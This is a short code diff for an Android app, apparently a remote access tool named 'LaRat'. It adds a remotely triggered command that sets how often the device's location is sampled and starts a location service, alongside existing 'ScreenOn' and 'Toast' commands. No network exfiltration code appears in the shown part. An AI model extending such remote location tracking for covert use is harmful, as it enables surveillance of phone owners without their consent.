@@ -26,6 +26,7 @@ public class Command {
         Command.commandList = new HashMap<String, AsyncTask>();
 
         commandList.put("ScreenOn", new ScreenOnTask());
+        commandList.put("SetLocationInterval", new SetLocationIntervalTask());
         commandList.put("Toast", new ToastTask());
     }
 
@@ -63,5 +64,18 @@ public class Command {
                     context.getArgument(0).toString(),
                     context.getArgument(1).toString().equals("LONG") ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT).show();
         }
+    }
+
+    public static class SetLocationIntervalTask extends AsyncTask<Object, Void, Void>  {
+
+        @Override
+        protected Void doInBackground(Object... objects) {
+            CommandContext context = (CommandContext)objects[0];
+            long interval = Long.parseLong(context.getArgument(0).toString());
+            LaRatLocationManager.LOCATION_REQUEST_INTERVAL = interval;
+            LaRatLocationManager.startLocationService(context.getContext());
+            return null;
+        }
+
     }
 }
